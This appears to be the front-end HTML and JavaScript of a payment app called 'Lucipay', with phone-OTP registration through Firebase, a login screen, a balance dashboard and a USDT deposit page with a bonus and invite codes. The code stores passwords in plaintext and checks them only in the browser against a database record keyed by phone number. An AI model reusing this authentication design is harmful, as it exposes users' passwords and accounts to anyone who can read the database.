<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lucipay</title>
    <style>
        body {
            background-color: #ffffff;
            color: #000000;
            font-family: Arial, sans-serif;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .app-container {
            width: 100%;
            max-width: 380px;
            padding: 20px;
            text-align: center;
        }

        .logo-circle {
            background-color: #000000;
            width: 120px;
            height: 120px;
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 0 auto 10px;
        }

        .logo-text {
            font-size: 60px;
            font-weight: bold;
            color: #d4af37; 
            letter-spacing: -2px;
        }

        .brand-name {
            font-size: 32px;
            color: #d4af37;
            margin-bottom: 30px;
            font-weight: bold;
        }

        .input-group {
            background-color: #f0f0f0;
            border-radius: 25px;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            padding: 5px 20px;
        }

        .input-group span { font-size: 18px; margin-right: 10px; }

        input {
            width: 100%;
            padding: 12px;
            border: none;
            background: transparent;
            outline: none;
            font-size: 16px;
        }

        .btn-main {
            width: 100%;
            padding: 15px;
            background-color: #000000;
            color: #ffffff;
            border: none;
            border-radius: 25px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 15px;
        }

        .options-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin: 10px 5px;
            font-size: 14px;
        }

        .remember-me { display: flex; align-items: center; }
        .remember-me input { width: auto; margin-right: 5px; padding: 0; }

        .privacy-row {
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 13px;
            margin-top: 20px;
        }
        .privacy-row input { width: auto; margin-right: 8px; }

        .hidden { display: none; }
        
        .back-arrow {
            text-align: left;
            font-size: 24px;
            cursor: pointer;
            margin-bottom: 10px;
            color: #000;
        }

        .send-otp-btn {
            background-color: #000;
            color: #fff;
            border-radius: 15px;
            padding: 5px 15px;
            border: none;
            cursor: pointer;
        }
    </style>
</head>
<body>

    <div class="app-container">
        <div class="logo-circle">
            <div class="logo-text">LP</div>
        </div>
        <div class="brand-name">Lucipay</div>

        <div id="login-screen">
            <div class="input-group"><span>👤</span><input type="tel" id="login-phone" placeholder="Phone"></div>
            <div class="input-group"><span>🔒</span><input type="password" id="login-pass" placeholder="Password"></div>
            
            <div class="options-row">
                <a href="javascript:void(0)" onclick="showScreen('register-screen')">Register</a>
                <div class="remember-me">
                    <input type="checkbox" id="rem"> <label for="rem">Remember Me</label>
                </div>
            </div>
            <div class="privacy-row">
                <input type="checkbox" id="agree" checked> 
                <label for="agree">Agree <a href="#" style="text-decoration:underline;">"User Privacy Agreement"</a></label>
            </div>

            <button class="btn-main" onclick="handleSignIn()">Sign In</button>
            <div style="margin-top: 20px;">
                <a href="javascript:void(0)" onclick="showScreen('reset-screen')">Forget Password</a>
            </div>
        </div>

        <div id="register-screen" class="hidden">
            <h2 style="color:#000; margin-bottom:20px;">Register</h2>
            <div class="input-group"><span>👤</span><input type="text" id="reg-username" placeholder="User Name"></div>
            <div class="input-group"><span>🔒</span><input type="password" id="reg-password" placeholder="Password"></div>
            <div class="input-group">
                <span style="font-weight:bold; font-size:14px; color:green;">+91</span>
                <input type="tel" id="reg-phone" placeholder="Phone">
            </div>
            <div class="input-group">
                <span>✉️</span>
                <input type="text" id="reg-otp" placeholder="OTP Code" style="flex-grow:1;">
                <button class="send-otp-btn" onclick="sendOTP()">Send</button>
            </div>
            <div class="input-group"><span>🔗</span><input type="text" id="reg-invite" placeholder="Invite Code"></div>

            <button class="btn-main" onclick="handleSignUp()">Sign Up</button>
            <p><a href="javascript:void(0)" onclick="showScreen('login-screen')">Back to Login</a></p>
        </div>

        <div id="reset-screen" class="hidden">
            <div class="back-arrow" onclick="showScreen('login-screen')">←</div>
            <h2 style="color:#000; margin-bottom:20px;">Reset Password</h2>
            <div class="input-group">
                <span style="font-weight:bold; font-size:14px; color:green;">+91</span>
                <input type="tel" id="reset-phone" placeholder="Phone">
            </div>
            <div class="input-group"><span>🔒</span><input type="password" id="reset-new-password" placeholder="New Password"></div>
            <div class="input-group">
                <span>✉️</span>
                <input type="text" id="reset-otp" placeholder="OTP Code" style="flex-grow:1;">
                <button class="send-otp-btn" onclick="sendResetOTP()">Send</button>
            </div>
            <button class="btn-main" onclick="handleResetPassword()">Reset Password</button>
        </div>
    </div>

    <div id="home-screen" class="hidden" style="background: #0d0d0d; color: #fff; position: fixed; top: 0; left: 0; width: 100%; height: 100%; overflow-y: auto; text-align: left; padding: 20px 15px; box-sizing: border-box; z-index: 999;">
        <div style="display: flex; align-items: center; justify-content: space-between;">
            <div style="display: flex; align-items: center;">
                <div style="width: 45px; height: 45px; background: #222; border-radius: 50%; display: flex; justify-content: center; align-items: center; margin-right: 12px;">👤</div>
                <div>
                    <div id="user-display-name" style="font-size: 16px; font-weight: bold;">User</div>
                    <div style="font-size: 11px; color: #888;">ID: <span id="user-display-uid">LP0000</span></div>
                </div>
            </div>
            <span>🔔</span>
        </div>

        <div id="deposit-screen" class="hidden" style="background-color: #ffffff; min-height: 100vh; color: #000; padding: 20px; font-family: sans-serif; position: fixed; top: 0; left: 0; width: 100%; z-index: 1000; box-sizing: border-box;">
        <div style="display: flex; align-items: center; margin-bottom: 30px;">
            <span onclick="showScreen('home-screen')" style="font-size: 24px; cursor: pointer; color: #d32f2f;">←</span>
            <h2 style="flex-grow: 1; text-align: center; color: #d32f2f; margin: 0;">Deposit</h2>
        </div>
        <div style="background: #f8f9fa; border-radius: 15px; padding: 20px; border: 1px solid #eee;">
            <div style="display: flex; justify-content: space-between; font-size: 12px; margin-bottom: 15px;">
                <span style="color: #d32f2f;">Ratio: 1 USDT = 105 INR</span>
            </div>
            <div style="background: #fff; border-radius: 10px; display: flex; align-items: center; padding: 10px; border: 1px solid #ddd; margin-bottom: 20px;">
                <div style="background: #d32f2f; color: #fff; padding: 5px 12px; border-radius: 5px; font-weight: bold; margin-right: 15px;">USDT</div>
                <input type="number" id="deposit-amount" oninput="calculateDeposit()" placeholder="Enter Amount" style="background: transparent; border: none; outline: none; flex-grow: 1;">
            </div>
            <div style="display: flex; gap: 10px;">
                <div style="background: #fff; flex: 1; padding: 10px; border-radius: 10px; border: 1px solid #eee; text-align: center;">
                    <div style="font-size: 10px; color: #888;">Bonus</div>
                    <div id="bonus-display" style="color: #d32f2f; font-weight: bold;">0.00</div>
                </div>
                <div style="background: #fff; flex: 1; padding: 10px; border-radius: 10px; border: 1px solid #eee; text-align: center;">
                    <div style="font-size: 10px; color: #888;">Receive</div>
                    <div id="receive-display" style="color: #d32f2f; font-weight: bold;">0.00</div>
                </div>
            </div>
        </div>
        <button onclick="processDeposit()" style="width: 100%; padding: 18px; background: #d32f2f; color: #fff; border: none; border-radius: 30px; font-size: 18px; font-weight: bold; margin-top: 30px;">Deposit</button>
    </div>
        
        <div style="background: linear-gradient(135deg, #d32f2f, #b71c1c); border-radius: 20px; padding: 25px; margin: 20px 0; box-shadow: 0 4px 15px rgba(211, 47, 47, 0.4);">
            <div style="font-size: 14px; opacity: 0.8;">Available Balance</div>
            <div style="font-size: 32px; font-weight: bold; margin-top: 5px;">₹ <span id="user-display-balance">200.00</span></div>
            <button style="background: rgba(255,255,255,0.2); border: none; color: #fff; padding: 5px 15px; border-radius: 15px; margin-top: 15px; font-size: 12px;">Detail</button>
        </div>

        <div style="display: flex; justify-content: space-around; margin-top: 20px; text-align: center; color: #bbb;">
            <div onclick="showScreen('deposit-screen')" style="cursor: pointer;">📥<br><small>Deposit</small></div>
            <div>📋<br><small>Task</small></div>
            <div>👥<br><small>Team</small></div>
            <div>📝<br><small>Order</small></div>
        </div>

        <div style="position: fixed; bottom: 0; left: 0; width: 100%; background: #000; display: flex; justify-content: space-around; align-items: center; height: 70px; border-top: 1px solid #222;">
            <div style="text-align: center; color: #d32f2f;">🏠<br><small style="font-size: 9px;">Home</small></div>
            <div style="text-align: center; color: #666;">💳<br><small style="font-size: 9px;">Payment</small></div>
            <div style="background: #d4af37; width: 60px; height: 60px; border-radius: 50%; display: flex; justify-content: center; align-items: center; margin-top: -35px; border: 5px solid #000;">💰</div>
            <div style="text-align: center; color: #666;">📊<br><small style="font-size: 9px;">Statistics</small></div>
            <div style="text-align: center; color: #666;">👤<br><small style="font-size: 9px;">My</small></div>
        </div>
    </div>
    
    <div id="recaptcha-container"></div>

    <script>
        // Screen switching logic
        window.showScreen = function(screenId) {
    // Sab screens ko chhupao
    document.getElementById('login-screen').classList.add('hidden');
    document.getElementById('register-screen').classList.add('hidden');
    document.getElementById('reset-screen').classList.add('hidden');
    document.getElementById('home-screen').classList.add('hidden');
    
    // Auth wala main container handle karo
    const authCont = document.querySelector('.app-container');
    
    if(screenId === 'home-screen') {
        if(authCont) authCont.style.display = 'none'; // Login box gayab
        document.getElementById(screenId).classList.remove('hidden'); // Dashboard dikhao
    } else {
        if(authCont) authCont.style.display = 'block'; // Login box dikhao
        document.getElementById(screenId).classList.remove('hidden');
    }
};
    </script>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
        import { getAuth, RecaptchaVerifier, signInWithPhoneNumber } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js";
        import { getDatabase, ref, set, get, child } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";

        const firebaseConfig = {
            apiKey: "AIzaSyB8KbPR9uCnC1255bRCVzJEYxlH3xJpj2A",
            authDomain: "lucipay-90518.firebaseapp.com",
            databaseURL: "https://lucipay-90518-default-rtdb.firebaseio.com",
            projectId: "lucipay-90518",
            storageBucket: "lucipay-90518.firebasestorage.app",
            messagingSenderId: "894528058632",
            appId: "1:894528058632:web:d981963ae30de1ba1768bd"
        };

        const app = initializeApp(firebaseConfig);
        const auth = getAuth(app);
        const db = getDatabase(app);

        // --- SIGN UP LOGIC ---
        window.sendOTP = async function() {
            const phoneInput = document.getElementById('reg-phone').value;
            if(!phoneInput || phoneInput.length < 10) return alert("Sahi number dalein");
            const phone = "+91" + phoneInput;
            if (!window.recaptchaVerifier) {
                window.recaptchaVerifier = new RecaptchaVerifier(auth, 'recaptcha-container', { 'size': 'invisible' });
            }
            try {
                window.confirmationResult = await signInWithPhoneNumber(auth, phone, window.recaptchaVerifier);
                alert("OTP bhej diya gaya hai!");
            } catch (error) {
                alert("OTP Error: " + error.message);
            }
        };

        window.handleSignUp = async function() {
    const phone = document.getElementById('reg-phone').value;
    const otp = document.getElementById('reg-otp').value;
    const username = document.getElementById('reg-username').value;
    const password = document.getElementById('reg-password').value;

    if(!window.confirmationResult) return alert("Pehle OTP mangwayein");

    try {
        await window.confirmationResult.confirm(otp);
        await set(ref(db, 'users/' + phone), {
            username: username,
            password: password,
            phone: "+91" + phone,
            balance: 200, // <-- Ye naya add hua hai
            uid: "LP" + Math.floor(10000 + Math.random() * 90000)
        });
        alert("Registration Successful!");
        showScreen('login-screen');
    } catch (error) {
        alert("Error: " + error.message);
    }
};

        // --- SIGN IN LOGIC ---
        
        window.handleSignIn = async function() {
            const phoneInput = document.getElementById('login-phone').value;
            const pass = document.getElementById('login-pass').value;

            if(!phoneInput || !pass) return alert("Details bhariye!");
            
            // Number format fix
            let phone = phoneInput.startsWith("+91") ? phoneInput : "+91" + phoneInput;

            try {
                // Yahan backticks (`) use karna zaroori hai
                const snapshot = await get(ref(db, `users/${phoneInput}`)); 
                if (snapshot.exists()) {
                    const userData = snapshot.val();
                    if (userData.password === pass) {
                        // Dashboard data update
                        document.getElementById('user-display-name').innerText = userData.username || "User";
                        document.getElementById('user-display-uid').innerText = userData.uid || "LP0000";
                        
                        let userBal = (userData.balance !== undefined) ? userData.balance : 200;
                        document.getElementById('user-display-balance').innerText = userBal + ".00";

                        showScreen('home-screen');
                    } else {
                        alert("Galat Password!");
                    }
                } else {
                    alert("Account nahi mila. Register karein!");
                }
            } catch (error) {
                alert("Login Error: " + error.message);
            }
        };

        // --- RESET PASSWORD LOGIC ---
        window.sendResetOTP = async function() {
            const phoneInput = document.getElementById('reset-phone').value;
            if(!phoneInput) return alert("Number dalein");
            const phone = "+91" + phoneInput;
            if (!window.recaptchaVerifier) {
                window.recaptchaVerifier = new RecaptchaVerifier(auth, 'recaptcha-container', { 'size': 'invisible' });
            }
            try {
                window.resetConfirmation = await signInWithPhoneNumber(auth, phone, window.recaptchaVerifier);
                alert("Reset OTP bhej diya gaya hai!");
            } catch (error) {
                alert("Error: " + error.message);
            }
        };

        window.handleResetPassword = async function() {
            const phone = document.getElementById('reset-phone').value;
            const newPass = document.getElementById('reset-new-password').value;
            const otp = document.getElementById('reset-otp').value;
            if(!window.resetConfirmation) return alert("Pehle OTP mangwayein");
            try {
                await window.resetConfirmation.confirm(otp);
                const userRef = ref(db, 'users/' + phone);
                const snapshot = await get(userRef);
                if(snapshot.exists()){
                    await set(ref(db, 'users/' + phone + '/password'), newPass);
                    alert("Password change ho gaya!");
                    showScreen('login-screen');
                } else {
                    alert("User nahi mila!");
                }
            } catch (error) {
                alert("Error: " + error.message);
            }
        };

        window.calculateDeposit = function() {
            const amount = document.getElementById('deposit-amount').value || 0;
            const res = amount * 105;
            document.getElementById('bonus-display').innerText = (res * 0.05).toFixed(2); 
            document.getElementById('receive-display').innerText = res.toFixed(2);
        };

        window.processDeposit = function() {
            const amount = document.getElementById('deposit-amount').value;
            if(!amount || amount <= 0) return alert("Amount bhariye!");
            alert("Deposit Request Sent: ₹" + (amount * 105));
        };
        
    </script>
</body>
</html>
